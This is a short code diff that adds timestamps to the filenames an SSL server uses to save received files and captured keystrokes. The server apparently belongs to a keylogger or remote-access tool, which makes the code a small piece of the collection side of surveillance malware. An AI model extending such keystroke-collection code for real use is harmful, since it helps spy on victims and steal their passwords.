@@ -6,6 +6,7 @@ import ssl
 from threading import Thread
 from utils.logger import setup_logger
 import json
+import datetime
 
 logger = setup_logger()
 
@@ -142,7 +143,8 @@ class SSLServer:
 
             content = "\n".join(lines[2:])
 
-            filename = "downloaded_file"
+            ct = datetime.datetime.now()
+            filename = "downloaded_file_" + ct.strftime("%Y%m%d_%H%M%S")
 
             with open(filename, "w") as f:
                 f.write(content)
@@ -169,7 +171,8 @@ class SSLServer:
                 print("No keystrokes captured")
                 return
 
-            filename = "keylogger_file"
+            ct = datetime.datetime.now()
+            filename = "keylogger_file_" + ct.strftime("%Y%m%d_%H%M%S")
 
             with open(filename, "w") as f:
                 f.write(content)
